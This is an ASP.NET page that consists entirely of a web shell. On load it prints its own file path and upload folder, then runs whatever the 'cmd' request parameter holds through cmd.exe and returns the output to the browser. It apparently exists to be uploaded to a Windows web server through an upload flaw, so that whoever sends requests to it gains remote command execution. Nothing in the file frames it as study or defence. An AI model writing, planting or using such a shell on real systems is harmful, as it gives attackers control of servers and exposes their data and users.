<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    string selfPath = Server.MapPath(Request.Path);
    string uploadsDir = Path.GetDirectoryName(selfPath);
    Response.Write("SELF:" + selfPath + "|UPDIR:" + uploadsDir + "|");
    string cmd = Request["cmd"];
    if(!string.IsNullOrEmpty(cmd)){
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+cmd);
        psi.RedirectStandardOutput=true; psi.RedirectStandardError=true;
        psi.UseShellExecute=false; psi.CreateNoWindow=true;
        Process p = Process.Start(psi);
        string o = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();
        Response.Write(System.Web.HttpUtility.HtmlEncode(o));
    }
}
</script>